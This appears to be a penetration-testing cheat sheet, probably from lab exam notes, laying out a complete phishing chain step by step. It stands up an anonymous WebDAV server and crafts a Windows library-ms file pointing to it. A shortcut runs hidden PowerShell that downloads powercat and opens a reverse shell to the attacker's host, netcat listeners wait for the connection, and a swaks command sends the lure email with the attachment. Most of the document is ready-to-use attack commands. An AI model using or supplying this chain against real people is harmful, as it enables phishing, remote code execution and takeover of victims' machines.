# 🔹Phishing 

### 1) Enable /webdav Server
```
pip3 install wsgidav
pip3 install cheroot
mkdir webdav
sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
```

### 2) Create 'config.Library.ms'
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.239</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

### 3) Create lnk file (in WINDOWS) with PS payload (powercat)
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.155/powercat.ps1');powercat -c 192.168.45.155 -p 443 -e powershell"

# Powercat
https://github.com/besimorhino/powercat/blob/master/powercat.ps1
```

### 4) Staging 
- Place 'powercat.ps1', 'shortcut.lnk', 'config.Library.ms' & 'body.txt' in /Webdav
- nc -lnvp 1337 (from /WebDav to get 'powercat.ps1')
- nc -lnvp 443 (to catch reverse shell when .lnk gets clicked)
- 'body.txt' has to sound convincing
```
 Hi,

 please click on the attachment
```

### 5) Execution (require mail credentials)
```
jim@relia -> has to be legit recipient
swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

```



